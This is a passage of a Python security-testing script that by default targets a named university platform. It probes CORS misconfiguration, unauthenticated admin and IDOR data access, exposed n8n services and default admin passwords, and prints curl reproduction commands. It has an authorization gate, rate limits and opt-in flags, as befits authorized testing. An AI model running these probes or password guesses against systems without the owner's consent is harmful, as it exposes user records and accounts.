        for target in (ctx["base"], ctx.get("login_url") or ctx["base"]):
            rr = req("OPTIONS", target, session, headers={
                "Origin": origin,
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "content-type"})
            acao = rr["headers"].get("Access-Control-Allow-Origin", "")
            acac = rr["headers"].get("Access-Control-Allow-Credentials", "")
            rr2 = req("GET", target, session, headers={"Origin": origin})
            acao2 = rr2["headers"].get("Access-Control-Allow-Origin", "")
            if (acao == origin or acao2 == origin) and \
                    acac.lower() == "true":
                report.add(Finding(
                    "CORS", "HIGH",
                    "CORS reflects attacker origin WITH credentials",
                    "Any website a logged-in user visits can read their "
                    "authenticated API responses (Origin: %s reflected, "
                    "credentials allowed)." % origin,
                    ["ACAO: %s | ACAC: %s" % (acao or acao2, acac)],
                    "curl -skI '%s' -H 'Origin: %s' -H "
                    "'Access-Control-Request-Method: POST' -X OPTIONS"
                    % (target, origin), "C10"))
                return
            if acao == origin or acao2 == origin:
                report.add(Finding(
                    "CORS", "MEDIUM", "CORS reflects arbitrary origin",
                    "Origin %s is reflected without credentials - data "
                    "read requires a token, but misconfiguration signals "
                    "weak CORS design." % origin,
                    ["ACAO: %s" % (acao or acao2)],
                    "curl -skI '%s' -H 'Origin: %s'" % (target, origin),
                    "C10"))
                return
    report.add(Finding("CORS", "OK", "No origin reflection detected",
                       "Attacker origins were not echoed by the server.",
                       [], "", "C10"))


# ---------------------------------------------------------------------------
# Module BAC  [C2] - broken access control / IDOR
# ---------------------------------------------------------------------------
IDOR_PATHS = ["/api/users/1", "/api/users/2", "/api/students/1",
              "/api/grades/1", "/api/staff/1", "/api/admin/users/1",
              "/api/user/1", "/api/profile/1"]


def bac_tests(session: requests.Session, ctx: Dict[str, Any],
              report: Report, token_opt: Optional[str]) -> None:
    print("\n=== BAC  [C2] broken access control (unauth + IDOR) ===")
    base = ctx["base"]
    hits = []
    for ep in DATA_ENDPOINTS + [e for e in ctx.get("endpoints", [])
                                if e.startswith("/api")][:20]:
        rr = req("GET", urljoin(base + "/", ep.lstrip("/")), session)
        if rr["ok"] and rr["status"] < 300 and len(rr["body"]) > 2:
            body_stripped = rr["body"].strip()
            if body_stripped.startswith(("{", "[")):
                hits.append((ep, rr["status"], rr["body"][:200]))

    # [V7] HECON admin controller routes, probed against the API base
    api_base = ctx.get("api_base")
    critical_hits = []
    if api_base:
        for p in HECON_BAC_PATHS:
            u = api_base.rstrip("/") + "/" + p
            rr = req("GET", u, session)
            if rr["ok"] and rr["status"] < 300 and \
                    rr["body"].strip().startswith(("{", "[")):
                if any(k in p.lower() for k in ("backup", "user",
                                                "permission", "tenant")):
                    critical_hits.append((u, rr["status"],
                                          rr["body"][:200]))
                else:
                    hits.append((u, rr["status"], rr["body"][:200]))

    if critical_hits:
        report.add(Finding(
            "BAC", "CRITICAL", "Admin/controller API returns data without "
            "authentication",
            "Sensitive controller routes (users/permissions/backups) "
            "answered 200 with JSON to an anonymous request. Client-side "
            "route guards are the ONLY barrier - every hidden admin screen "
            "is reachable this way.",
            ["GET %s -> %d: %s" % h for h in critical_hits[:8]],
            "curl -sk '%s'" % critical_hits[0][0], "C2"))
    if hits:
        report.add(Finding(
            "BAC", "HIGH", "API returns data without authentication",
            "Read endpoints answered 200 with JSON to an unauthenticated "
            "request. Client-side route guards are the ONLY barrier - "
            "every hidden admin screen is reachable this way.",
            ["GET %s -> %d: %s" % h for h in hits[:8]],
            "curl -sk '%s'" % urljoin(base + "/",
                                      hits[0][0].lstrip("/")), "C2"))
    if not hits and not critical_hits:
        report.add(Finding("BAC", "OK",
                           "No unauthenticated data endpoints found",
                           "Probed endpoints refused anonymous access.",
                           [], "", "C2"))

    # IDOR with low-priv token
    if token_opt:
        idor_paths = list(IDOR_PATHS)
        api_base = ctx.get("api_base")
        if api_base:
            # [V7] authenticated reads on the real controller routes
            idor_paths += [api_base.rstrip("/") + "/" + p
                           for p in ("Users/", "MyApplicationUser/",
                                     "Participants/", "teachers/")]
        idor_hits = []
        for p in idor_paths:
            u = p if p.startswith("http") else \
                urljoin(base + "/", p.lstrip("/"))
            rr = req("GET", u, session,
                     headers={"Authorization": "Bearer " + token_opt})
            if rr["ok"] and rr["status"] < 300 and \
                    rr["body"].strip().startswith(("{", "[")):
                idor_hits.append("GET %s -> %d: %s" % (u, rr["status"],
                                                       rr["body"][:150]))
        if idor_hits:
            report.add(Finding(
                "BAC", "HIGH", "IDOR: low-privilege token reads other "
                "users' records",
                "A normal user token can fetch records by changing the id "
                "in the URL. Server-side object ownership is not checked.",
                idor_hits[:6],
                "curl -sk '%sapi/users/2' -H 'Authorization: Bearer "
                "<lowpriv-token>'" % base, "C2"))
        else:
            report.add(Finding("BAC", "OK",
                               "No IDOR in sampled id-based endpoints",
                               "Object-level checks appear enforced on the "
                               "sampled routes.", [], "", "C2"))


# ---------------------------------------------------------------------------
# Module SATEL  [C1] - auxiliary services referenced by the app config
# ---------------------------------------------------------------------------
def satellite_tests(session: requests.Session, ctx: Dict[str, Any],
                    report: Report) -> None:
    print("\n=== SATEL  [C1] auxiliary services (n8n / ws / ...) ===")
    sats = ctx.get("satellites") or []
    if not sats:
        report.add(Finding("SATEL", "OK",
                           "No auxiliary services discovered",
                           "The app config referenced no additional "
                           "same-domain services.", [], "", "C1"))
        return
    for sat in sats:
        if sat.startswith("wss://"):
            report.add(Finding(
                "SATEL", "INFO", "WebSocket service referenced: " + sat,
                "Realtime (mediasoup) endpoint. Verify the upgrade request "
                "requires authentication, otherwise the service can be "
                "used for bandwidth theft or becomes a DoS amplifier.",
                [sat], "", "C1"))
            continue
        r = req("GET", sat, session, max_body=4000)
        if not r["ok"]:
            report.add(Finding(
                "SATEL", "INFO", "Auxiliary host unreachable: " + sat,
                "Could not connect from this network (may still be "
                "reachable internally - check from an allowed network).",
                [r.get("error", "")], "", "C1"))
            continue
        m = re.search(r"<title>([^<]{0,100})</title>", r["body"], re.I)
        title = (m.group(1) if m else "").strip()
        ev = ["GET %s -> %d | title=%r | server=%s" % (
            sat, r["status"], title, r["headers"].get("Server", "-"))]
        if "n8n" in r["body"].lower() or "n8n" in title.lower():
            report.add(Finding(
                "SATEL", "LOW", "n8n automation instance publicly "
                "reachable: " + sat,
                "An n8n workflow-automation instance is exposed to the "
                "public internet. n8n has shipped serious CVEs (webhook "
                "auth bypass, data-sharing flaws). Restrict it to VPN or "
                "an IP allowlist, pin the latest patched version, and "
                "audit workflows that hold credentials.",
                ev, "curl -skI %s" % sat, "C1"))
            rr = req("GET", sat.rstrip("/") + "/rest/settings", session,
                     max_body=2000)
            if rr["ok"] and rr["status"] == 200:
                report.add(Finding(
                    "SATEL", "HIGH", "n8n /rest/settings readable "
                    "anonymously",
                    "Anonymous access to instance settings may disclose "
                    "version, OAuth config and features - reconnaissance "
                    "value for follow-on attacks.",
                    [rr["body"][:300]],
                    "curl -sk %s/rest/settings" % sat.rstrip("/"), "C1"))
        else:
            report.add(Finding(
                "SATEL", "INFO", "Auxiliary service reachable: " + sat,
                "Same-domain service discovered in the app bundle. Review "
                "its exposure, authentication and version.",
                ev, "curl -skI %s" % sat, "C1"))


# ---------------------------------------------------------------------------
# Module CRED  [C11] - default credentials (opt-in, max 6 attempts)
# ---------------------------------------------------------------------------
def cred_tests(session: requests.Session, ctx: Dict[str, Any],
               report: Report, probe_user: Optional[str]) -> None:
    print("\n=== CRED  [C11] default credentials (opt-in, 6 max) ===")
    url = ctx.get("login_url")
    if not url:
        report.add(Finding("CRED", "INFO", "Login endpoint unknown",
                           "Credential check skipped.", [], "", "C11"))
        return
    target_user = probe_user or "admin"
    combos = [("admin", "admin"), ("admin", "admin123"),
              ("admin", "123456"), ("admin", "password"),
              ("admin", "admin@123"), ("admin", "P@ssw0rd")]
    print("  [cred] testing against account: %s (6 attempts)" % target_user)
    for u, p in combos:
        rr = req("POST", url, session,
                 json_body={"email": target_user, "password": p})
        if looks_like_login_success(rr):
            report.add(Finding(
                "CRED", "CRITICAL", "Default credentials work: %s/%s"
                % (target_user, p),
                "A default/guessable password grants immediate account "
                "control.", ["HTTP %d | %s" % (rr["status"],
                                               rr["body"][:200])],
                curl_for("POST", url,
                         '{"email":"%s","password":"%s"}' % (target_user, p),
                         {"Content-Type": "application/json"}), "C11"))
            return
    report.add(Finding("CRED", "OK", "No default credentials accepted",
                       "6 common combos failed against %s." % target_user,
                       [], "", "C11"))


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main() -> int:
    global RATE_SECONDS, REQ_TIMEOUT, VERBOSE, TENANT_ID
    ap = argparse.ArgumentParser(
        description="HECON auth security reproduction (authorized use "
                    "only)")
    ap.add_argument("--target", default="https://hecon.arishuniversity.com")
    ap.add_argument("--i-am-authorized", action="store_true",
                    help="required safety gate: confirm you are authorized")
    ap.add_argument("--allow-register", action="store_true",
                    help="enable mass-assignment tests (creates test "
                         "accounts)")
    ap.add_argument("--allow-reset", action="store_true",
                    help="enable password-reset flow tests (sends reset "
                         "emails)")
    ap.add_argument("--test-creds", action="store_true",
                    help="enable 6-attempt default-credential check")
    ap.add_argument("--token", default=None,
                    help="low-privilege JWT for IDOR/forgery tests")
    ap.add_argument("--probe-user", default=None,
                    help="known-real email address for enumeration tests")
    ap.add_argument("--api-base", default=None,
                    help="override API base URL if auto-discovery fails "
                         "(e.g. https://hecon.arishuniversity.com:4000/api)")
    ap.add_argument("--login-path", default=None,
                    help="override login endpoint path if auto-discovery "
                         "fails (e.g. /api/Users/login/) - find it in "
                         "browser DevTools > Network tab while logging in")
    ap.add_argument("--tenant", default=None,
                    help="X-Tenant-Id header value to send on API requests "
                         "(HECON is multi-tenant; the SPA adds this header) "
                         "- check the Network tab for the real value")
    ap.add_argument("--report-dir", default=None)
    ap.add_argument("--rate", type=float, default=1.0)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    if not args.i_am_authorized:
        print("[!] Authorization gate: re-run with --i-am-authorized after "
              "confirming you own/operate this system.")
        return 2
    RATE_SECONDS = max(0.3, args.rate)
    REQ_TIMEOUT = args.timeout
    VERBOSE = args.verbose
    TENANT_ID = args.tenant

    base = args.target.rstrip("/")
    guardrails = {
        "max_login_attempts": "~8", "brute_force": False,
        "destructive": False,
        "opt_ins": {"register": args.allow_register,
                    "reset": args.allow_reset,
                    "creds": args.test_creds},
        "tenant_header": args.tenant or "(not set)",
    }
    print("=" * 74)
    print(" HECON AUTH SECURITY REPRODUCTION v1.2 (authorized-owner mode)")
    print(" target      : %s" % base)
    print(" rate limit  : %.1fs between requests | timeout: %ds"
          % (RATE_SECONDS, REQ_TIMEOUT))
    print(" guardrails  : %s" % json.dumps(guardrails["opt_ins"]))
    print(" tenant hdr  : %s" % (args.tenant or "(not set)"))
    print("=" * 74)

    session = requests.Session()
    report = Report()

    ctx = discover(session, base, report, args.allow_register,
                   args.allow_reset, args.api_base, args.login_path)
    trans_tests(session, base, report, ctx.get("api_base"))
    enum_tests(session, ctx, report, args.probe_user)
    bypass_tests(session, ctx, report, args.probe_user)
    if args.allow_register:
        massign_tests(session, ctx, report, base)
    else:
        report.add(Finding("MASSIGN", "INFO", "Skipped (--allow-register "
                           "not set)", "Role-injection test disabled.", [],
                           "", "C5"))
    jwt_tests(session, ctx, report, args.token)
    if args.allow_reset:
        reset_tests(session, ctx, report, args.probe_user)
    else:
        report.add(Finding("RESET", "INFO", "Skipped (--allow-reset not "
                           "set)", "Password-reset tests disabled.", [], "",
                           "C7"))
    rate_tests(session, ctx, report)
    cors_tests(session, ctx, report)
    bac_tests(session, ctx, report, args.token)
    satellite_tests(session, ctx, report)
    if args.test_creds:
        cred_tests(session, ctx, report, args.probe_user)
    else:
        report.add(Finding("CRED", "INFO", "Skipped (--test-creds not set)",
                           "Default-credential check disabled (safe "
                           "default; may lock accounts).", [], "", "C11"))

    s = report.summary()
    print("\n" + "=" * 74)
    print(" SUMMARY: CRITICAL=%d HIGH=%d MEDIUM=%d LOW=%d INFO=%d OK=%d"
          % (s["CRITICAL"], s["HIGH"], s["MEDIUM"], s["LOW"],
             s["INFO"], s["OK"]))
    print("=" * 74)
    if args.report_dir:
        import os
        os.makedirs(args.report_dir, exist_ok=True)
        jpath = os.path.join(args.report_dir, "hecon_report.json")
        hpath = os.path.join(args.report_dir, "hecon_report.html")
        meta = {"target": base, "guardrails": guardrails}
        report.dump_json(jpath, meta)
        report.dump_html(hpath, meta)
        print(" [+] reports written: %s , %s" % (jpath, hpath))
    print(" [+] Reminder: delete any sectest_repro_* accounts created.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
